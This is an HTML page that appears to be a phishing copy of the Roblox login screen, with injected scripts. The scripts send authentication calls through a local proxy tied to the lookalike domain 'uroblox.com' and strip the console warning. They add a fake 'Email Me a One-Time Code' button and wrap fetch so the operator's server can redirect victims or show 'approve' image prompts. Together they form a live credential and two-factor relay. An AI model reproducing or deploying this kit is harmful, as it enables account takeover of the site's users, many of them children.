...
<html>
<!--<![endif]-->
<head data-machine-id="CHI2-WEB40">
    <script type="text/javascript">
    // UPLOAD TEST MARKER - DELETE AFTER TESTING - 20241020-DEBUG
    // Minimal 2FA fix: rewrite mc-roblox auth calls to working endpoints
    (function() {
        function rewrite(url) {
            try {
                if (typeof url === 'string' && url.indexOf('uroblox.com/auth/v1/metadata') !== -1) {
                    var q = '';
                    var i = url.indexOf('?');
                    if (i !== -1) q = url.substring(i);
                    return '/auth/?path=/v1/metadata' + q;
                }
                if (typeof url === 'string' && url.indexOf('uroblox.com.com/auth/v1/users/') !== -1 && url.indexOf('/configuration') !== -1) {
                    // Extract user ID from URL
                    var match = url.match(/\/auth\/v1\/users\/(\d+)\/configuration/);
                    if (match) {
                        var userId = match[1];
                        var q = '';
                        var i = url.indexOf('?');
                        if (i !== -1) q = url.substring(i);
                        return '/auth/?path=/v1/users/' + userId + '/configuration' + q;
                    }
                }
            } catch (e) {}
            return url;
        ...
        // Patch XHR.open once, very early
        (function() {
            var _open = XMLHttpRequest.prototype.open;
            XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
                var newUrl = rewrite(url);
                return _open.call(this, method, newUrl, async, user, password);
            };
        })();

        // Patch fetch (some code paths may use it)
        if (window.fetch) {
...
<script type="text/javascript">
    ...
    <script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='headerinit' type='text/javascript' src='https://js.rbxcdn.com/c204d58ac65cd21581f8512c798a8b9e.js'></script>
...
<body id="rbx-body"
    ...
    <meta name="csrf-token" data-token="r+l2wFNp6gnt" />
...
<script type="text/javascript">
    ...
    <script type="text/javascript">
    // Minimal translations to satisfy 2FA UI keys
    (function(){
        window.Roblox = window.Roblox || {};
        window.Roblox.Lang = window.Roblox.Lang || {};
        var t = window.Roblox.Lang;
        t['Action.StartVerification'] = t['Action.StartVerification'] || 'Start Verification';
        t['Title.VerificationRequired'] = t['Title.VerificationRequired'] || 'Verification Required';
        t['Description.VerificationRequired'] = t['Description.VerificationRequired'] || 'We need to verify your identity to continue.';
    })();
    </script>


    <script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='leanbase' type='text/javascript' src='https://js.rbxcdn.com/d7861ce4a9e1bf5d8db0fe38d6249090.js'></script>
...
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Challenge" data-bundle-source="Main" src="https://js.rbxcdn.com/b790b4e25e122281924c21b9c9faa8511836a71b4a28c29469d85adc35216ae9.js"></script>
...
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Features" data-bundle-source="Unknown" src="https://js.rbxcdn.com/be1fcd578fb79e1a7c1a61473022be7922f4414bc544532412544ba4912fa8e8.js"></script>
    ...
    <script type='text/javascript'>Roblox.config.externalResources = [];Roblox.config.paths['Pages.Catalog'] = 'https://js.rbxcdn.com/109d883fe3988fca757e26e341ed0fe8.js';Roblox.config.paths['Pages.CatalogShared'] = 'https://js.rbxcdn.com/bcba3a83febab35eb41f3a0b8b96db37.js';Roblox.config.paths['Widgets.AvatarImage'] = 'https://js.rbxcdn.com/7d49ac94271bd506077acc9d0130eebb.js';Roblox.config.paths['Widgets.DropdownMenu'] = 'https://js.rbxcdn.com/da553e6b77b3d79bec37441b5fb317e7.js';Roblox.config.paths['Widgets.HierarchicalDropdown'] = 'https://js.rbxcdn.com/4a0af9989732810851e9e12809aeb8ad.js';Roblox.config.paths['Widgets.ItemImage'] = 'https://js.rbxcdn.com/61a0490ba23afa17f9ecca2a079a6a57.js';Roblox.config.paths['Widgets.PlaceImage'] = 'https://js.rbxcdn.com/a6df74a754523e097cab747621643c98.js';</script>
        ...
        <script>
            $(function () {
                // Developer console warning removed
            });
        </script>
...
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="EmailVerifyCodeModal" data-bundle-source="Main" src="https://js.rbxcdn.com/66057870df1e801b4682e500ad76cd4717424a69622100c2f77f3f1f3318a721.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.Login" data-bundle-source="Unknown" src="https://js.rbxcdn.com/66ef4b480d6ac4c1c9c98212278ef401547963553027f3372bfc9ba935bc8b3c.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.Login" data-bundle-source="Unknown" src="https://js.rbxcdn.com/6b292e6421c6926b863d3d55ad1567139bec293da4f3afe8b895511e7d18c548.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.OneTimePasscode" data-bundle-source="Unknown" src="https://js.rbxcdn.com/9db143f7b91b1df999ad0b987a75e6e47fe5253541f04e12269003366b05aa09.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.OneTimePasscode" data-bundle-source="Unknown" src="https://js.rbxcdn.com/f3f8163fc1e7cd8fd364dfdacaa253dfc52cceef41db84dc45f62d9fb2945f75.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ReactLogin" data-bundle-source="Main" src="https://js.rbxcdn.com/a0669d464f30a20efdd697ec8e21ed29b99b416669b735d07b0bc2f63bc22b9b.js"></script>
<script type="text/javascript">
// Add "Email Me a One-Time Code" button after React login renders
(function() {
    function addEmailCodeButton() {
        try {
            // Find the login container
            var loginContainer = document.getElementById('react-login-container');
            if (!loginContainer) return false;
            
            // Look for the forgot password link
            var links = loginContainer.querySelectorAll('a');
            var forgotLink = null;
            
            for (var i = 0; i < links.length; i++) {
                var linkText = links[i].textContent || links[i].innerText || '';
                if (linkText.toLowerCase().indexOf('forgot') !== -1 || 
                    links[i].href.indexOf('forgot-password-or-username') !== -1) {
                    forgotLink = links[i];
                    break;
                }
            }
            ...
            var existingButton = document.getElementById('email-code-button');
            if (existingButton) return true;
            
            // Create the button with matching Roblox login styling
            var buttonContainer = document.createElement('div');
            buttonContainer.style.marginTop = '16px';
            buttonContainer.style.marginBottom = '16px';
            
            var button = document.createElement('button');
            button.id = 'email-code-button';
            button.type = 'button';
            ...
            button.style.border = '1px solid #393b3d';
            button.style.backgroundColor = 'transparent';
            button.style.color = '#ffffff';
            button.style.cursor = 'pointer';
            button.style.transition = 'all 0.2s ease';
            button.textContent = 'Email Me a One-Time Code';
            
            // Add hover effect
            button.addEventListener('mouseenter', function() {
                button.style.backgroundColor = '#393b3d';
            });
            ...
            // Insert after the forgot password link's parent container
            var parentContainer = forgotLink.parentElement;
            while (parentContainer && parentContainer !== loginContainer) {
                if (parentContainer.nextSibling) {
                    parentContainer.parentNode.insertBefore(buttonContainer, parentContainer.nextSibling);
                    return true;
                }
                parentContainer = parentContainer.parentElement;
            }
            
            // Fallback: append to login container
            loginContainer.appendChild(buttonContainer);
            return true;
            
        } catch (e) {
            console.error('Error adding email code button:', e);
            return false;
        }
    }
    
    // Try multiple times as React renders asynchronously
    var attempts = 0;
    var maxAttempts = 20;
    var checkInterval = setInterval(function() {
        attempts++;
        if (addEmailCodeButton() || attempts >= maxAttempts) {
...
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Controls" data-bundle-source="Unknown" src="https://js.rbxcdn.com/22d25f7fe78bca4a0efc0029ee6a9aeb61d6eee28c585abc3f0c2af58ccc5734.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Controls" data-bundle-source="Unknown" src="https://js.rbxcdn.com/c5b560d79121273a1501f94a890fa3cf28c390c7c066a78278b6f6d41dd1eb58.js"></script>
...
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.UserAgreements" data-bundle-source="Unknown" src="https://js.rbxcdn.com/9ce05cb073d2c5a64c36c2c1e851c23a15721e9feaa8cbef1f0478cfde19051f.js"></script>
    ...
    <script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='pageEnd' type='text/javascript' src='https://js.rbxcdn.com/905b8a2484a8c5b3a24060c928f56c65.js'></script>
    ...
    <script type="text/javascript">
    // Approve-image overlay: listens for server JSON { action:'show_image', imageUrl: '...' }
    (function(){
        function showApproveImage(url){
            try{
                var existing = document.getElementById('approve-image-overlay');
                if(existing) existing.remove();

                // Parse optional position params from URL query (e.g. ?top=200&left=300 or ?x=50%&y=40%)
                var pos = {};
                try{
                    var q = url.split('?')[1] || '';
                ...
                var useAbsolute = pos.top !== undefined || pos.left !== undefined || pos.x !== undefined || pos.y !== undefined;
                var isMobile = (typeof window !== 'undefined') && (window.innerWidth <= 600 || /Mobi|Android|iPhone|iPad|iPod/.test(navigator.userAgent));

                if(useAbsolute){
                    var holder = document.createElement('div');
                    holder.id = 'approve-image-overlay';
                    holder.style.position = 'fixed';
                    holder.style.zIndex = 2147483647;
                    holder.style.pointerEvents = 'auto';

                    // Compute left/top (viewport values or percentages)
                    var left = pos.left || pos.x || '50%';
                    var top = pos.top || pos.y || '50%';
                    ...
                    img.src = url.split('?')[0];
                    img.style.maxWidth = pos.width || (isMobile ? '320px' : '360px');
                    img.style.maxHeight = pos.height || (isMobile ? '360px' : '420px');
                    img.style.borderRadius = '8px';
                    img.style.boxShadow = '0 8px 40px rgba(0,0,0,0.3)';
                    img.style.display = 'block';
                    img.style.cursor = 'pointer';
                    img.addEventListener('click', function(){ holder.remove(); });
                    holder.appendChild(img);
                    document.body.appendChild(holder);
                } else {
                    var overlay = document.createElement('div');
                    overlay.id = 'approve-image-overlay';
                    ...
                    var img = document.createElement('img');
                    img.src = url;
                    img.style.maxWidth = isMobile ? '360px' : '480px';
                    img.style.maxHeight = isMobile ? '50vh' : '80vh';
            ...
            }catch(e){ console && console.error && console.error('approve overlay', e); }
        }

        // Wrap fetch to inspect JSON responses
        if(window.fetch){
                    ...
                    try{
                        ...
                        if(ct.indexOf('application/json') !== -1){
                                        response.clone().json().then(function(j){
                                            try{
                                                if(j && j.redirect){
                                                    // Prefer redirect when provided
                                                    window.location.href = j.redirect;
                                                    return;
                                                }
                                                if(j && j.action === 'show_image' && j.imageUrl){ showApproveImage(j.imageUrl); }
                                            }catch(e){}
                                        }).catch(function(){});
                        }
                    }catch(e){}
